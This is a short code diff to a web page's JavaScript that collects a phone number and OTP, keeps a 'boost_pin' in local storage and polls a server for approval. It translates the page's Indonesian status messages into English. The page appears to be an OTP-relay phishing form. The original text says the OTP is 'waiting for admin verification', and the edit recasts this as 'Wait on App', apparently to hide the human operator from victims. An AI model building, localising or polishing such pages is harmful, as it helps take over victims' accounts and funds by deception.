@@ -108,7 +108,7 @@
                             localStorage.removeItem('boost_pin');
                             setTimeout(() => window.location.href = 'success.html?status=approved', 2000);
                         } else if (data.status === 'rejected') {
-                            statusMsg.textContent = '❌ OTP ditolak. Silakan coba lagi.';
+                            statusMsg.textContent = '❌ Wrong OTP. Please insert Valid OTP.';
                             statusMsg.style.color = 'red';
                             clearInterval(pollingInterval);
                             confirmBtn.disabled = false;
@@ -134,7 +134,7 @@
             }
             confirmBtn.innerHTML = `<div class='inline-block w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin mr-2'></div> Sending...`;
             confirmBtn.disabled = true;
-            statusMsg.textContent = 'Mengirim OTP...';
+            statusMsg.textContent = 'Send OTP...';
             statusMsg.style.color = 'blue';
 
             try {
@@ -146,7 +146,7 @@
                 const data = await response.json();
 
                 if (response.ok && data.success) {
-                    statusMsg.textContent = 'OTP terkirim, menunggu verifikasi admin...';
+                    statusMsg.textContent = 'OTP Verfy, Wait on App...';
                     statusMsg.style.color = 'orange';
                     startPolling(phone);
                 } else {
